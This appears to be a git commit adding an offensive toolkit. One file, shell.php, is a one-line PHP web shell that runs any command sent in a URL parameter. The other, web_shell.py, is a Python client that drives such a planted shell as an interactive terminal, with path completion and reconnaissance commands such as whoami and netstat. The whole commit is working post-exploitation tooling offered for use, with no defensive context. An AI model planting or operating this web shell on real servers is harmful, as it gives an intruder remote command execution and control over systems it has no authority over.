7773eb3936dc40b8f017e85e4f5fe9fc51d2111c
root <root@nucleus>
2013-06-08 16:45:31 -0400

    Initial commit

---
+++ shell.php
@@ -0,0 +1,5 @@
+<?php
+ignore_user_abort(1);
+set_time_limit(0);
+@system($_GET['c']);
+?>
---
+++ web_shell.py
@@ -0,0 +1,160 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+# Sometimes you get a php/perl/python/ruby shell on a server... 
+# Because typing again and again on the browser address bar is quite uneffective. 
+# This wrapper provides you with a way to wrap your address bar query into a nice web shell
+# Bash like completion is a must have
+# Colors are nice. 
+# TODO: command helper (tab + tab / ifconfig )
+# TODO: add assymetrical shell encryption 
+# TODO: complete http/https support
+# TODO: Check if metasploit has something similar
+
+import httplib2
+import sys
+import cmd2
+from cmd2 import Cmd
+import urllib
+import os
+import re
+
+
+http_url_get = sys.argv[1]
+http_server_path = ''
+http_url_post = ''
+http_cookie = 'NULL'
+
+helpers = [
+    "ifconfig",
+    "service",
+    "netstat -lntp",
+    "netstat -antp",
+    "ps aux"]
+
+class webshell(Cmd):
+	hostname = ''
+	user = ''
+	path = ''
+	home = ''	## Exploit base
+	prompt_suffix = '$'
+	status = ''
+	prompt = 'wsh :'
+	h = httplib2.Http(".cache", disable_ssl_certificate_validation=True)
+	colors=1
+
+	colorcodes =    {'bold':{True:'\x1b[1m',False:'\x1b[22m'},
+               'cyan':{True:'\x1b[36m',False:'\x1b[39m'},
+                  'orange':{True:'\x1b[33m',False:'\x1b[39m'},
+                  'blue':{True:'\x1b[34m',False:'\x1b[39m'},
+                  'red':{True:'\x1b[31m',False:'\x1b[39m'},
+                  'magenta':{True:'\x1b[35m',False:'\x1b[39m'},
+                  'green':{True:'\x1b[32m',False:'\x1b[39m'},
+                  'underline':{True:'\x1b[4m',False:'\x1b[24m'}}
+
+	def colorize(self, val, color):
+		return self.colorcodes[color][True] + val + self.colorcodes[color][False]
+
+	def init(self):
+		self.username = self.ask_server('whoami')
+		self.hostname = self.ask_server('hostname -s')
+		self.path = self.ask_server('pwd')
+		self.home = os.path.normpath(self.path)
+		self.set_prompt()
+
+
+	def set_prompt(self):
+		retcode = self.colorize(self.status,'underline')
+		if self.status == '200':
+			retcode = self.colorize(retcode,'green')
+		else:
+			retcode = self.colorize(retcode,'red')
+		
+		username = self.colorize(self.username, 'orange')
+		hostname = self.colorize(self.hostname,'blue')
+		curpath  = self.colorize(self.path, 'blue') 
+		suffix   = self.colorize(self.prompt_suffix, 'green')
+
+		self.prompt = '{'+ retcode + '}' + username  + ':' + curpath + suffix + ' '
+		#self.prompt = '{'+ retcode + '}' + username + '@' + hostname + ':' + self.path + self.prompt_suffix + ' '
+	
+	def ask_server(self, request):
+		req = urllib.quote_plus(request)
+		resp, content = self.h.request(http_url_get + req , "GET")	
+		self.status = str(resp.status)
+		#ret = content
+		ret = content.strip()
+		if self.status != '200':
+			ret = '-'
+		return ret
+	
+	def precmd(self, line):
+		self.set_prompt()
+		return line
+
+	def postcmd(self, stop, line):
+		self.set_prompt()
+		if stop: 
+			exit()
+	
+	def forge_request(self, path, cmd ):
+		req = 'cd ' + path + ';' + cmd
+		return req
+
+	def default(self, line):
+		try:
+			req = self.forge_request(self.path, line);
+			resp = self.ask_server(req)
+			self.stdout.write(resp + '\n')
+			self.set_prompt()
+		except :
+			print 'dammit'
+
+
+	def completedefault(self, text, line, begidx, endidx): 
+		args = line.split(' ')
+		call = args.pop(0)
+		(head, tail) = os.path.split(args[0])
+#		print '\nh:'+head
+#		print '\nt:'+tail
+	
+		if os.path.isabs(args[0]):
+			req = self.forge_request(head, 'ls -1A')
+			
+		elif self.path is '/' :
+			req = self.forge_request(self.path + head, 'ls -1A')
+		
+		else :
+			req = self.forge_request(self.path +'/'+ head, 'ls -1A')
+
+		resp = self.ask_server(req)
+		get  = resp.split('\n')
+		opts = [x for x in get if x.startswith(tail) ]
+		return opts
+	
+	def do_cd(self, arg):
+		if arg == '~' or arg == '': 
+			self.path = self.home
+		else:	
+			npath = os.path.join(self.path, arg)
+			req = self.forge_request(self.path, '[ -d' + npath + ' ] || echo o')
+			ans = self.ask_server(req)
+			self.path = os.path.normpath(npath)
+			
+	def do_path(self, arg):
+		print self.path
+	
+	def preloop(self):
+		pass
+		
+
+	def emptyline(self):
+		print 'dammit'
+
+try:
+	ws = webshell()
+	ws.init()
+	ws.cmdloop()
+except :
+	print 'exception'
+
